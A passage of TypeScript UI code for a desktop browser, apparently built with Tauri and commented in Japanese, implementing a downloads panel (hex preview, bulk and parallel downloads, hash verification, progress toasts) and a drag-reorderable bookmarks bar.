              truncated: boolean;
              bytes: number;
            }>("downloads_hex_preview", { id: it.id });
            if (hexCtx.content && hexCtx.title) {
              hexCtx.title.textContent = `HEX: ${it.filename} (${fmtBytes(r.bytes)}${r.truncated ? ", 先頭のみ" : ""})`;
              hexCtx.content.textContent = r.hex || "(空ファイル)";
              showHexCtx(hexCtx, true);
            }
          } catch (e) {
            alert(`HEX 取得失敗: ${e}`);
          }
        }),
      );
    }
    actions.appendChild(
      mkBtn("🔗 URL", "URL をコピー", () => {
        void navigator.clipboard.writeText(it.url);
      }),
    );
    actions.appendChild(
      mkBtn("⌨ cURL", "cURL コマンドをコピー", async () => {
        try {
          const c = await invoke<string>("downloads_curl_for", { id: it.id });
          await navigator.clipboard.writeText(c);
        } catch (e) {
          alert(`cURL 生成失敗: ${e}`);
        }
      }),
    );
    actions.appendChild(
      mkBtn("🗑 削除", "履歴から削除", () => {
        void invoke("downloads_remove", { id: it.id }).then(() => {
          items = items.filter((x) => x.id !== it.id);
          render();
        });
      }),
    );
    li.appendChild(actions);
    return li;
  };

  const render = (): void => {
    if (!listEl || !emptyEl) return;
    listEl.innerHTML = "";
    if (tbList) tbList.innerHTML = "";
    const isEmpty = items.length === 0;
    emptyEl.hidden = !isEmpty;
    if (tbEmpty) tbEmpty.hidden = !isEmpty;
    const completed = items.filter((i) => i.status === "completed").length;
    const totalBytes = items
      .filter((i) => i.status === "completed")
      .reduce((s, i) => s + i.bytes, 0);
    const statText = `${items.length}件 / 完了${completed} / ${fmtBytes(totalBytes)}`;
    if (statEl) statEl.textContent = statText;
    if (tbStat) tbStat.textContent = statText;
    const populateVerify = (sel: HTMLSelectElement | null): void => {
      if (!sel) return;
      const cur = sel.value;
      sel.innerHTML = "";
      for (const it of [...items].reverse()) {
        if (it.status !== "completed") continue;
        const opt = document.createElement("option");
        opt.value = String(it.id);
        opt.textContent = it.filename;
        sel.appendChild(opt);
      }
      if (cur) sel.value = cur;
    };
    populateVerify(verifySel);
    populateVerify(tbVerifySel);
    const sorted = [...items].sort((a, b) => b.started_at - a.started_at);
    for (const it of sorted) {
      listEl.appendChild(buildItemEl(it, panelHexCtx));
      if (tbList) tbList.appendChild(buildItemEl(it, tbHexCtx));
    }
    updateBadge();
  };

  const refresh = async (): Promise<void> => {
    try {
      items = await invoke<DownloadItem[]>("downloads_list");
    } catch (e) {
      console.error("downloads_list failed:", e);
      items = [];
    }
    render();
  };

  const openDownloadsPanel = async (): Promise<void> => {
    try {
      await closeToolboxPanel();
    } catch {
      /* noop */
    }
    // ページを退避する前にスクリーンショットを撮って背景に設定
    try {
      const result = await invoke<{
        data_url: string;
        title_bar_height: number;
        logical_width: number;
        logical_height: number;
      }>("capture_active_page");
      document.body.style.backgroundImage = `url('${result.data_url}')`;
      document.body.style.backgroundSize = `${result.logical_width}px ${result.logical_height}px`;
      document.body.style.backgroundPosition = `0 ${-result.title_bar_height}px`;
      document.body.style.backgroundRepeat = "no-repeat";
    } catch (e) {
      console.error("capture_active_page failed:", e);
    }
    document.body.classList.add("downloads-overlay-open");
    try {
      await invoke("ui_set_expanded", { expanded: true });
    } catch {
      /* noop */
    }
    panel.hidden = false;
    await refresh();
  };
  const closeDownloadsPanel = (): void => {
    panel.hidden = true;
    document.body.classList.remove("downloads-overlay-open");
    document.body.style.backgroundImage = "";
    document.body.style.backgroundSize = "";
    document.body.style.backgroundPosition = "";
    document.body.style.backgroundRepeat = "";
    void invoke("ui_set_expanded", { expanded: false }).catch(() => {});
  };

  btn?.addEventListener("click", () => {
    const opening = panel.hidden;
    // ツールボックスは事前に隠す
    const tbPanelEl = document.getElementById(
      "toolbox-panel",
    ) as HTMLDivElement | null;
    if (tbPanelEl) {
      tbPanelEl.hidden = true;
      tbPanelEl.style.display = "none";
    }
    if (backdrop) backdrop.hidden = true;
    if (opening) {
      // panel.hidden は openDownloadsPanel 内で WebView 拡張後に false にする
      void openDownloadsPanel();
    } else {
      closeDownloadsPanel();
    }
  });
  closeBtn?.addEventListener("click", () => {
    panel.hidden = true;
    if (backdrop) backdrop.hidden = true;
    showHexView(false);
    closeDownloadsPanel();
  });
  backdrop?.addEventListener("click", () => {
    panel.hidden = true;
    backdrop.hidden = true;
    showHexView(false);
    closeDownloadsPanel();
  });
  clearBtn?.addEventListener("click", () => {
    if (!confirm("完了済みダウンロード履歴を全てクリアしますか?")) return;
    void invoke("downloads_clear").then(() => void refresh());
  });
  openFolderBtn?.addEventListener("click", () => {
    void invoke("downloads_open_folder");
  });
  engineerToggle?.addEventListener("click", () => {
    if (engineerPanel) engineerPanel.hidden = !engineerPanel.hidden;
  });
  hexBack?.addEventListener("click", () => {
    showHexView(false);
  });
  tbHexBack?.addEventListener("click", () => {
    if (tbHexView) tbHexView.hidden = true;
  });

  // エンジニア: 手動ダウンロード
  const parseHeaders = (text: string): Array<[string, string]> => {
    const out: Array<[string, string]> = [];
    for (const line of text.split(/\r?\n/)) {
      const m = line.match(/^\s*([^:]+?)\s*:\s*(.+?)\s*$/);
      if (m) out.push([m[1], m[2]]);
    }
    return out;
  };
  const engGo = document.getElementById("dl-eng-go");
  const engBulkGo = document.getElementById("dl-eng-bulk-go");
  const engUrl = document.getElementById(
    "dl-eng-url",
  ) as HTMLInputElement | null;
  const engName = document.getElementById(
    "dl-eng-name",
  ) as HTMLInputElement | null;
  const engUa = document.getElementById("dl-eng-ua") as HTMLInputElement | null;
  const engRef = document.getElementById(
    "dl-eng-ref",
  ) as HTMLInputElement | null;
  const engHeaders = document.getElementById(
    "dl-eng-headers",
  ) as HTMLTextAreaElement | null;
  const engBulk = document.getElementById(
    "dl-eng-bulk",
  ) as HTMLTextAreaElement | null;
  const verifyHash = document.getElementById(
    "dl-eng-verify-hash",
  ) as HTMLInputElement | null;
  const verifyGo = document.getElementById("dl-eng-verify-go");
  const verifyResult = document.getElementById("dl-eng-verify-result");
  const parallelChk = document.getElementById(
    "dl-eng-parallel",
  ) as HTMLInputElement | null;
  const connectionsInput = document.getElementById(
    "dl-eng-connections",
  ) as HTMLInputElement | null;
  const randomizeChk = document.getElementById(
    "dl-eng-randomize",
  ) as HTMLInputElement | null;
  // Toolbox 連携要素
  const tbUrl = document.getElementById("tb-dl-url") as HTMLInputElement | null;
  const tbName = document.getElementById(
    "tb-dl-name",
  ) as HTMLInputElement | null;
  const tbRand = document.getElementById(
    "tb-dl-rand",
  ) as HTMLInputElement | null;
  const tbParallel = document.getElementById(
    "tb-dl-parallel",
  ) as HTMLInputElement | null;
  const tbConn = document.getElementById(
    "tb-dl-conn",
  ) as HTMLInputElement | null;
  const tbGo = document.getElementById("tb-dl-go");
  const tbOpenPanel = document.getElementById("tb-dl-open-panel");
  const tbFillCurrent = document.getElementById("tb-dl-fill-current");
  const tbStatus = document.getElementById("tb-dl-status");

  // ランダムなファイル名 (拡張子は維持) を生成
  const randomizeFilename = (urlOrName: string): string => {
    let ext = "";
    try {
      const u = new URL(urlOrName);
      const m = u.pathname.match(/\.([a-zA-Z0-9]{1,8})$/);
      if (m) ext = "." + m[1];
    } catch {
      const m = urlOrName.match(/\.([a-zA-Z0-9]{1,8})$/);
      if (m) ext = "." + m[1];
    }
    const rand = Array.from(crypto.getRandomValues(new Uint8Array(12)))
      .map((b) => b.toString(36).padStart(2, "0"))
      .join("")
      .slice(0, 16);
    return `dl_${Date.now().toString(36)}_${rand}${ext}`;
  };

  // ⬇ ボタンのパルス & トースト表示
  const pulseDownloadBtn = (): void => {
    if (!btn) return;
    btn.classList.remove("dl-pulse");
    // reflow trigger
    void btn.offsetWidth;
    btn.classList.add("dl-pulse");
    window.setTimeout(() => btn.classList.remove("dl-pulse"), 1900);
  };
  let toastHost: HTMLDivElement | null = null;
  const ensureToastHost = (): HTMLDivElement => {
    if (toastHost && document.body.contains(toastHost)) return toastHost;
    toastHost = document.createElement("div");
    toastHost.className = "dl-toast-host";
    document.body.appendChild(toastHost);
    return toastHost;
  };
  const showToast = (
    title: string,
    body?: string,
    variant: "info" | "finished" | "failed" = "info",
    durationMs = 3500,
  ): void => {
    const host = ensureToastHost();
    const el = document.createElement("div");
    el.className = `dl-toast dl-toast-${variant}`;
    const t = document.createElement("div");
    t.className = "dl-toast-title";
    t.textContent = title;
    el.appendChild(t);
    if (body) {
      const b = document.createElement("div");
      b.className = "dl-toast-body";
      b.textContent = body;
      el.appendChild(b);
    }
    host.appendChild(el);
    el.addEventListener("click", () => {
      panel.hidden = false;
      if (backdrop) backdrop.hidden = false;
      void (async () => {
        try {
          await closeToolboxPanel();
        } catch {
          /* noop */
        }
        try {
          await invoke("ui_set_expanded", { expanded: true });
        } catch {
          /* noop */
        }
        await refresh();
      })();
      el.remove();
    });
    window.setTimeout(() => {
      el.classList.add("dl-toast-leave");
      window.setTimeout(() => el.remove(), 260);
    }, durationMs);
  };

  // ---- 進捗付きトースト (ダウンロード単位で固定表示) ----
  interface ProgressToast {
    el: HTMLDivElement;
    body: HTMLSpanElement;
    bar: HTMLDivElement;
    pct: HTMLSpanElement;
    finished: boolean;
  }
  const progressToasts = new Map<number, ProgressToast>();
  const fmtETA = (sec: number): string => {
    if (!isFinite(sec) || sec < 0) return "--";
    if (sec < 60) return `${Math.ceil(sec)}秒`;
    if (sec < 3600) return `${Math.floor(sec / 60)}分${Math.ceil(sec % 60)}秒`;
    const h = Math.floor(sec / 3600);
    const m = Math.floor((sec % 3600) / 60);
    return `${h}時間${m}分`;
  };
  const openDownloadsPanelQuick = (): void => {
    panel.hidden = false;
    if (backdrop) backdrop.hidden = false;
    void (async () => {
      try {
        await closeToolboxPanel();
      } catch {
        /* noop */
      }
      try {
        await invoke("ui_set_expanded", { expanded: true });
      } catch {
        /* noop */
      }
      await refresh();
    })();
  };
  const ensureProgressToast = (id: number, filename: string): ProgressToast => {
    const existing = progressToasts.get(id);
    if (existing && document.body.contains(existing.el)) return existing;
    const host = ensureToastHost();
    const el = document.createElement("div");
    el.className = "dl-toast dl-toast-info dl-toast-progress";
    const t = document.createElement("div");
    t.className = "dl-toast-title";
    t.textContent = "⬇ ダウンロード中";
    el.appendChild(t);
    const fname = document.createElement("div");
    fname.className = "dl-toast-body";
    fname.textContent = filename;
    el.appendChild(fname);
    const barWrap = document.createElement("div");
    barWrap.className = "dl-toast-barwrap";
    const bar = document.createElement("div");
    bar.className = "dl-toast-bar";
    bar.style.width = "0%";
    barWrap.appendChild(bar);
    el.appendChild(barWrap);
    const meta = document.createElement("div");
    meta.className = "dl-toast-meta";
    const pct = document.createElement("span");
    pct.className = "dl-toast-pct";
    pct.textContent = "0%";
    const body = document.createElement("span");
    body.className = "dl-toast-stats";
    body.textContent = "計測中...";
    meta.appendChild(pct);
    meta.appendChild(body);
    el.appendChild(meta);
    el.addEventListener("click", () => openDownloadsPanelQuick());
    host.appendChild(el);
    const rec: ProgressToast = { el, body, bar, pct, finished: false };
    progressToasts.set(id, rec);
    return rec;
  };
  const updateProgressToast = (
    id: number,
    bytes: number,
    total: number | null,
    speed: number,
  ): void => {
    const rec = progressToasts.get(id);
    if (!rec || rec.finished) return;
    if (total && total > 0) {
      const ratio = Math.min(1, bytes / total);
      rec.bar.style.width = `${(ratio * 100).toFixed(1)}%`;
      rec.pct.textContent = `${(ratio * 100).toFixed(1)}%`;
      const remain = total - bytes;
      const eta = speed > 0 ? remain / speed : Infinity;
      rec.body.textContent = `${fmtBytes(bytes)} / ${fmtBytes(total)} · ${
        speed > 0 ? `${fmtBytes(speed)}/s` : "--"
      } · 残り ${fmtETA(eta)}`;
    } else {
      rec.bar.style.width = "100%";
      rec.bar.classList.add("dl-toast-bar-indet");
      rec.pct.textContent = "?%";
      rec.body.textContent = `${fmtBytes(bytes)} · ${
        speed > 0 ? `${fmtBytes(speed)}/s` : "--"
      }`;
    }
  };
  const finishProgressToast = (
    id: number,
    status: string,
    filename: string,
    totalBytes?: number,
  ): void => {
    const rec = progressToasts.get(id);
    if (!rec) {
      // 進捗トーストが無いケース (即終了など) はワンショットで通知
      const lower = (status || "").toLowerCase();
      if (lower === "failed") {
        showToast("✗ ダウンロード失敗", filename, "failed", 5000);
      } else if (lower === "cancelled" || lower === "canceled") {
        showToast("⊘ キャンセルされました", filename, "failed", 4000);
      } else {
        showToast("✓ ダウンロード完了", filename, "finished", 4000);
      }
      return;
    }
    rec.finished = true;
    const lower = (status || "").toLowerCase();
    rec.el.classList.remove("dl-toast-info");
    rec.bar.classList.remove("dl-toast-bar-indet");
    if (lower === "failed") {
      rec.el.classList.add("dl-toast-failed");
      const t = rec.el.querySelector(".dl-toast-title");
      if (t) t.textContent = "✗ ダウンロード失敗";
      rec.body.textContent = filename;
    } else if (lower === "cancelled" || lower === "canceled") {
      rec.el.classList.add("dl-toast-failed");
      const t = rec.el.querySelector(".dl-toast-title");
      if (t) t.textContent = "⊘ キャンセルされました";
      rec.body.textContent = filename;
    } else {
      rec.el.classList.add("dl-toast-finished");
      const t = rec.el.querySelector(".dl-toast-title");
      if (t) t.textContent = "✓ ダウンロード完了";
      rec.bar.style.width = "100%";
      rec.pct.textContent = "100%";
      if (totalBytes && totalBytes > 0) {
        rec.body.textContent = `${filename} · ${fmtBytes(totalBytes)}`;
      } else {
        rec.body.textContent = filename;
      }
    }
    window.setTimeout(
      () => {
        rec.el.classList.add("dl-toast-leave");
        window.setTimeout(() => {
          rec.el.remove();
          progressToasts.delete(id);
        }, 260);
      },
      lower === "failed" || lower === "cancelled" || lower === "canceled"
        ? 6000
        : 4000,
    );
  };

  const triggerSave = async (
    url: string,
    filename?: string,
    overrides?: {
      randomize?: boolean;
      parallel?: boolean;
      connections?: number;
      headers?: Array<[string, string]>;
      userAgent?: string | null;
      referrer?: string | null;
    },
  ): Promise<void> => {
    const wantRandom = overrides?.randomize ?? randomizeChk?.checked ?? false;
    let finalName = filename;
    if (wantRandom) {
      finalName = randomizeFilename(filename || url);
    }
    const opts = {
      url,
      filename: finalName ?? null,
      headers:
        overrides?.headers ??
        (engHeaders ? parseHeaders(engHeaders.value) : []),
      user_agent: overrides?.userAgent ?? engUa?.value ?? null,
      referrer: overrides?.referrer ?? engRef?.value ?? null,
      parallel: overrides?.parallel ?? parallelChk?.checked ?? true,
      connections: Math.max(
        2,
        Math.min(
          32,
          overrides?.connections ??
            (parseInt(connectionsInput?.value ?? "8", 10) || 8),
        ),
      ),
    };
    // 即座にフィードバック (ボタンのパルスのみ。詳細トーストは download-started で表示)
    pulseDownloadBtn();
    try {
      await invoke<number>("downloads_save_url", { opts });
    } catch (e) {
      showToast("ダウンロード失敗", String(e), "failed", 5000);
      alert(`ダウンロード失敗: ${e}`);
    }
  };
  engGo?.addEventListener("click", () => {
    const u = engUrl?.value?.trim();
    if (!u) {
      alert("URL を入力してください");
      return;
    }
    void triggerSave(u, engName?.value?.trim() || undefined);
    if (engUrl) engUrl.value = "";
    if (engName) engName.value = "";
  });
  // Toolbox 側 (📥 ダウンロード) 配線
  tbFillCurrent?.addEventListener("click", () => {
    const a = activeTab();
    if (a && tbUrl) tbUrl.value = a.url;
  });
  tbOpenPanel?.addEventListener("click", () => {
    panel.hidden = false;
    if (backdrop) backdrop.hidden = false;
    void (async () => {
      try {
        await closeToolboxPanel();
      } catch {
        /* noop */
      }
      try {
        await invoke("ui_set_expanded", { expanded: true });
      } catch {
        /* noop */
      }
      await refresh();
    })();
  });
  tbGo?.addEventListener("click", () => {
    const u = tbUrl?.value?.trim();
    if (!u) {
      if (tbStatus) tbStatus.textContent = "URL を入力してください";
      return;
    }
    if (tbStatus) tbStatus.textContent = "送信しました";
    void triggerSave(u, tbName?.value?.trim() || undefined, {
      randomize: tbRand?.checked,
      parallel: tbParallel?.checked,
      connections: parseInt(tbConn?.value ?? "8", 10) || 8,
      headers: tbHeaders ? parseHeaders(tbHeaders.value) : undefined,
      userAgent: tbUa?.value || null,
      referrer: tbRef?.value || null,
    });
    if (tbUrl) tbUrl.value = "";
    if (tbName) tbName.value = "";
    window.setTimeout(() => {
      if (tbStatus) tbStatus.textContent = "";
    }, 2500);
  });
  tbBulkGo?.addEventListener("click", () => {
    const text = tbBulk?.value ?? "";
    const urls = text
      .split(/\r?\n/)
      .map((s) => s.trim())
      .filter((s) => /^https?:\/\//.test(s));
    if (urls.length === 0) {
      alert("有効な URL が見つかりません");
      return;
    }
    if (!confirm(`${urls.length} 件をダウンロードしますか?`)) return;
    void (async () => {
      for (const u of urls) {
        await triggerSave(u, undefined, {
          randomize: tbRand?.checked,
          parallel: tbParallel?.checked,
          connections: parseInt(tbConn?.value ?? "8", 10) || 8,
          headers: tbHeaders ? parseHeaders(tbHeaders.value) : undefined,
          userAgent: tbUa?.value || null,
          referrer: tbRef?.value || null,
        });
      }
    })();
  });
  tbVerifyGo?.addEventListener("click", async () => {
    const id = parseInt(tbVerifySel?.value ?? "", 10);
    const exp = tbVerifyHash?.value?.trim();
    if (!id || !exp) {
      if (tbVerifyResult)
        tbVerifyResult.textContent = "対象とハッシュ値を指定してください";
      return;
    }
    if (tbVerifyResult) tbVerifyResult.textContent = "検証中...";
    try {
      const ok = await invoke<boolean>("downloads_verify_hash", {
        id,
        expected: exp,
      });
      if (tbVerifyResult) {
        tbVerifyResult.textContent = ok
          ? "✓ 一致しました"
          : "✗ 不一致 (改ざん/破損の可能性)";
        tbVerifyResult.style.color = ok ? "#4ade80" : "#f87171";
      }
      await refresh();
    } catch (e) {
      if (tbVerifyResult) tbVerifyResult.textContent = `エラー: ${e}`;
    }
  });

  engBulkGo?.addEventListener("click", () => {
    const text = engBulk?.value ?? "";
    const urls = text
      .split(/\r?\n/)
      .map((s) => s.trim())
      .filter((s) => /^https?:\/\//.test(s));
    if (urls.length === 0) {
      alert("有効な URL が見つかりません");
      return;
    }
    if (!confirm(`${urls.length} 件をダウンロードしますか?`)) return;
    void (async () => {
      for (const u of urls) {
        await triggerSave(u);
      }
    })();
  });
  verifyGo?.addEventListener("click", async () => {
    const id = parseInt(verifySel?.value ?? "", 10);
    const exp = verifyHash?.value?.trim();
    if (!id || !exp) {
      if (verifyResult)
        verifyResult.textContent = "対象とハッシュ値を指定してください";
      return;
    }
    if (verifyResult) verifyResult.textContent = "検証中...";
    try {
      const ok = await invoke<boolean>("downloads_verify_hash", {
        id,
        expected: exp,
      });
      if (verifyResult) {
        verifyResult.textContent = ok
          ? "✓ 一致しました"
          : "✗ 不一致 (改ざん/破損の可能性)";
        verifyResult.style.color = ok ? "#4ade80" : "#f87171";
      }
      await refresh();
    } catch (e) {
      if (verifyResult) verifyResult.textContent = `エラー: ${e}`;
    }
  });

  // イベントリスナ
  await listen<DownloadItem>("download-started", (ev) => {
    const it = ev.payload;
    const idx = items.findIndex((x) => x.id === it.id);
    const isNew = idx < 0;
    if (idx >= 0) items[idx] = it;
    else items.push(it);
    progressMap.delete(it.id);
    if (panel.hidden) {
      updateBadge();
    } else {
      render();
    }
    updateBadge();
    if (isNew) {
      pulseDownloadBtn();
      const fname = it.filename || it.url || "(ファイル)";
      ensureProgressToast(it.id, fname);
    }
  });
  await listen<{ id: number; bytes: number; total: number | null }>(
    "download-progress",
    (ev) => {
      progressMap.set(ev.payload.id, {
        bytes: ev.payload.bytes,
        total: ev.payload.total,
      });
      // 速度推定 (EMA)
      const now = performance.now();
      const prev = speedTracker.get(ev.payload.id);
      let ema = 0;
      if (prev) {
        const dt = (now - prev.lastTime) / 1000;
        if (dt > 0.05) {
          const inst = (ev.payload.bytes - prev.lastBytes) / dt;
          ema = prev.ema === 0 ? inst : prev.ema * 0.6 + inst * 0.4;
          speedTracker.set(ev.payload.id, {
            lastBytes: ev.payload.bytes,
            lastTime: now,
            ema,
          });
        } else {
          ema = prev.ema;
        }
      } else {
        speedTracker.set(ev.payload.id, {
          lastBytes: ev.payload.bytes,
          lastTime: now,
          ema: 0,
        });
      }
      // 進捗トースト更新 (まだ無ければ作成)
      const it = items.find((x) => x.id === ev.payload.id);
      const fname = it?.filename || it?.url || "(ファイル)";
      ensureProgressToast(ev.payload.id, fname);
      updateProgressToast(
        ev.payload.id,
        ev.payload.bytes,
        ev.payload.total,
        ema,
      );
      if (!panel.hidden) render();
    },
  );
  await listen<DownloadItem>("download-finished", (ev) => {
    const it = ev.payload;
    const idx = items.findIndex((x) => x.id === it.id);
    if (idx >= 0) items[idx] = it;
    else items.push(it);
    progressMap.delete(it.id);
    if (!panel.hidden) render();
    updateBadge();
    const fname = it.filename || it.url || "(ファイル)";
    finishProgressToast(it.id, it.status || "", fname, it.bytes ?? undefined);
  });

  await refresh();
}

// ===== ブックマーク =====

interface BookmarkInfo {
  id: number;
  url: string;
  title: string;
  favicon: string;
  added_at: number;
}

let bookmarks: BookmarkInfo[] = [];
let bookmarksBarEl: HTMLDivElement | null = null;
let bookmarkToggleBtn: HTMLButtonElement | null = null;
let bookmarksPanel: HTMLDivElement | null = null;
let bookmarksListEl: HTMLUListElement | null = null;
let bookmarksEmptyEl: HTMLDivElement | null = null;
let bookmarksOpen = false;

function isBookmarked(url: string): boolean {
  return bookmarks.some((b) => b.url === url);
}

function updateBookmarkToggle(): void {
  if (!bookmarkToggleBtn) return;
  const a = activeTab();
  const url = a?.url ?? "";
  const on = !!url && isBookmarked(url);
  bookmarkToggleBtn.classList.toggle("is-bookmarked", on);
  bookmarkToggleBtn.textContent = on ? "★" : "☆";
  bookmarkToggleBtn.title = on
    ? "このページのブックマークを解除 (Ctrl+D)"
    : "このページをブックマーク (Ctrl+D)";
}

async function toggleBookmarkCurrent(): Promise<void> {
  const a = activeTab();
  if (!a || !a.url) return;
  const existing = bookmarks.find((b) => b.url === a.url);
  try {
    if (existing) {
      await invoke("bookmarks_remove", { id: existing.id });
    } else {
      await invoke<BookmarkInfo>("bookmarks_add", {
        url: a.url,
        title: a.title || urlToTitle(a.url),
        favicon: a.favicon || null,
      });
    }
  } catch (e) {
    console.error("bookmark toggle failed:", e);
  }
}

function renderBookmarksBar(): void {
  if (!bookmarksBarEl) return;
  bookmarksBarEl.innerHTML = "";
  if (bookmarks.length === 0) {
    const empty = document.createElement("span");
    empty.className = "bookmarks-bar-empty";
    empty.textContent =
      "アドレスバー横の ☆ でブックマーク追加。ここに表示されます。";
    bookmarksBarEl.appendChild(empty);
    return;
  }
  for (const b of bookmarks) {
    const el = document.createElement("div");
    el.className = "bookmarks-bar-item";
    el.dataset.id = String(b.id);
    el.title = `${b.title}\n${b.url}`;

    const fav = document.createElement("img");
    fav.className = "bb-favicon";
    fav.alt = "";
    fav.referrerPolicy = "no-referrer";
    fav.draggable = false;
    setupCascadingFavicon(fav, b.favicon, b.url);
    el.appendChild(fav);

    const title = document.createElement("span");
    title.className = "bb-title";
    title.textContent = b.title || urlToTitle(b.url);
    el.appendChild(title);

    el.addEventListener("click", (e) => {
      e.preventDefault();
      // Ctrl/Shift+クリックまたは中クリックは新しいタブで開く。
      if (
        e.ctrlKey ||
        e.shiftKey ||
        e.metaKey ||
        (e as MouseEvent).button === 1
      ) {
        void tabNew(b.url);
      } else {
        void navigate(b.url);
      }
    });
    el.addEventListener("auxclick", (e) => {
      const me = e as MouseEvent;
      if (me.button === 1) {
        e.preventDefault();
        void tabNew(b.url);
      }
    });
    el.addEventListener("contextmenu", (e) => {
      e.preventDefault();
      // シンプルな確認ダイアログで削除。
      if (confirm(`ブックマークを削除しますか?\n${b.title}\n${b.url}`)) {
        void invoke("bookmarks_remove", { id: b.id }).catch((err) =>
          console.error("bookmarks_remove failed:", err),
        );
      }
    });
    el.addEventListener("pointerdown", (e) => {
      const pe = e as PointerEvent;
      if (pe.button !== 0) return;
      startBookmarkDrag(b.id, el, pe);
    });
    bookmarksBarEl.appendChild(el);
  }
}

/** ブックマークバー項目のドラッグによる並び替え。 */
function startBookmarkDrag(
  bmId: number,
  el: HTMLDivElement,
  downEvt: PointerEvent,
): void {
  const startX = downEvt.clientX;
  const startY = downEvt.clientY;
  let dragging = false;
  let suppressClick = false;

  const findTargetAtX = (
    x: number,
  ): { el: HTMLDivElement; index: number } | null => {
    if (!bookmarksBarEl) return null;
    const els = Array.from(
      bookmarksBarEl.querySelectorAll<HTMLDivElement>(".bookmarks-bar-item"),
    );
    let best: { el: HTMLDivElement; index: number; dist: number } | null = null;
    for (let i = 0; i < els.length; i++) {
      const e = els[i];
      if (Number(e.dataset.id) === bmId) continue;
      const r = e.getBoundingClientRect();
      let dist: number;
      if (x < r.left) dist = r.left - x;
      else if (x > r.right) dist = x - r.right;
      else dist = 0;
      if (best === null || dist < best.dist) {
        best = { el: e, index: i, dist };
      }
    }
    return best ? { el: best.el, index: best.index } : null;
  };

  const setMarkers = (x: number) => {
    document
      .querySelectorAll(
        ".bookmarks-bar-item.drop-before, .bookmarks-bar-item.drop-after",
      )
      .forEach((n) => n.classList.remove("drop-before", "drop-after"));
    const t = findTargetAtX(x);
    if (!t) return;
    const r = t.el.getBoundingClientRect();
    const before = x < r.left + r.width / 2;
    t.el.classList.toggle("drop-before", before);
    t.el.classList.toggle("drop-after", !before);
  };

  const onMove = (ev: PointerEvent) => {
    if (!dragging) {
      if (
        Math.abs(ev.clientX - startX) > 5 ||
        Math.abs(ev.clientY - startY) > 5
      ) {
        dragging = true;
        el.classList.add("dragging");
        suppressClick = true;
      } else {
        return;
      }
    }
    // タブバーの上にいるかをハイライト
    const tabbarEl = document.querySelector(".tabbar") as HTMLElement | null;
    if (tabbarEl) {
      const tr = tabbarEl.getBoundingClientRect();
      const overTabbar =
        ev.clientY >= tr.top &&
        ev.clientY <= tr.bottom &&
        ev.clientX >= tr.left &&
        ev.clientX <= tr.right;
      tabbarEl.classList.toggle("drop-url", overTabbar);
      if (overTabbar) {
        // タブバー上のときは並び替えマーカーは消す
        document
          .querySelectorAll(
            ".bookmarks-bar-item.drop-before, .bookmarks-bar-item.drop-after",
          )
          .forEach((n) => n.classList.remove("drop-before", "drop-after"));
        return;
      }
    }
    setMarkers(ev.clientX);
  };

  const onUp = (ev: PointerEvent) => {
    window.removeEventListener("pointermove", onMove, true);
    window.removeEventListener("pointerup", onUp, true);
    window.removeEventListener("pointercancel", onCancel, true);
    document
      .querySelectorAll(
        ".bookmarks-bar-item.drop-before, .bookmarks-bar-item.drop-after",
      )
      .forEach((n) => n.classList.remove("drop-before", "drop-after"));
    document.querySelector(".tabbar")?.classList.remove("drop-url");
    el.classList.remove("dragging");
    if (!dragging) return;
    // タブバー (tabs) の上にドロップ → 新しいタブで開く。
    const tabbarEl = document.querySelector(".tabbar") as HTMLElement | null;
    if (tabbarEl) {
      const tr = tabbarEl.getBoundingClientRect();
      if (
        ev.clientY >= tr.top &&
        ev.clientY <= tr.bottom &&
        ev.clientX >= tr.left &&
        ev.clientX <= tr.right
      ) {
        const bm = bookmarks.find((x) => x.id === bmId);
        if (bm) void tabNew(bm.url);
        return;
      }
    }
    // それ以外はバー内での並び替え。
    const t = findTargetAtX(ev.clientX);
    if (!t) return;
    const r = t.el.getBoundingClientRect();
    const before = ev.clientX < r.left + r.width / 2;
    const fromIdx = bookmarks.findIndex((x) => x.id === bmId);
    if (fromIdx < 0) return;
    let to = before ? t.index : t.index + 1;
    if (fromIdx < to) to -= 1;
    if (to === fromIdx) return;
    void invoke("bookmarks_reorder", { id: bmId, toIndex: to }).catch((err) =>
      console.error("bookmarks_reorder failed:", err),
    );
  };

  const onCancel = () => {
    window.removeEventListener("pointermove", onMove, true);
    window.removeEventListener("pointerup", onUp, true);
    window.removeEventListener("pointercancel", onCancel, true);
    document
      .querySelectorAll(
        ".bookmarks-bar-item.drop-before, .bookmarks-bar-item.drop-after",
      )
      .forEach((n) => n.classList.remove("drop-before", "drop-after"));
    el.classList.remove("dragging");
  };

  window.addEventListener("pointermove", onMove, true);
  window.addEventListener("pointerup", onUp, true);
  window.addEventListener("pointercancel", onCancel, true);

  // ドラッグ完了直後に発生する click を抑制する。
  el.addEventListener(
    "click",
    (ce) => {
      if (suppressClick) {
        ce.preventDefault();
        ce.stopPropagation();
        suppressClick = false;
      }
    },
    { once: true, capture: true },
  );
}

function renderBookmarksPanel(): void {
  if (!bookmarksListEl || !bookmarksEmptyEl) return;
  bookmarksListEl.innerHTML = "";
  if (bookmarks.length === 0) {
    bookmarksEmptyEl.hidden = false;
    return;
  }
  bookmarksEmptyEl.hidden = true;
  for (const b of bookmarks) {
    const li = document.createElement("li");
    li.className = "bookmark-item";
    (li as HTMLElement).dataset.bmId = String(b.id);

    const handle = document.createElement("div");
    handle.className = "bookmark-handle";
    handle.textContent = "⋮⋮";
    handle.title = "ドラッグして並び替え";
    handle.addEventListener("pointerdown", (e) => {
      e.stopPropagation();
      startBookmarkPanelDrag(b.id, li, e);
    });
    handle.addEventListener("click", (e) => {
      e.stopPropagation();
    });
    handle.addEventListener("auxclick", (e) => {
      e.stopPropagation();
    });
    li.appendChild(handle);

    const fav = document.createElement("img");
    fav.className = "bookmark-favicon";
    fav.alt = "";
    fav.referrerPolicy = "no-referrer";
    setupCascadingFavicon(fav, b.favicon, b.url);
    li.appendChild(fav);

    const text = document.createElement("div");
    text.className = "bookmark-text";
    const t = document.createElement("div");
    t.className = "bookmark-title";
    t.textContent = b.title || urlToTitle(b.url);
    const u = document.createElement("div");
    u.className = "bookmark-url";
    u.textContent = b.url;
    text.appendChild(t);
    text.appendChild(u);
    li.appendChild(text);

    const rm = document.createElement("button");
    rm.type = "button";
    rm.className = "bookmark-remove";
    rm.textContent = "🗑";
    rm.title = "ブックマークを削除";
    rm.addEventListener("click", (e) => {
      e.stopPropagation();
      void invoke("bookmarks_remove", { id: b.id }).catch((err) =>
        console.error("bookmarks_remove failed:", err),
      );
    });
    li.appendChild(rm);

    li.addEventListener("click", (e) => {
      if (e.ctrlKey || e.shiftKey || e.metaKey) {
        void tabNew(b.url);
      } else {
        void navigate(b.url);
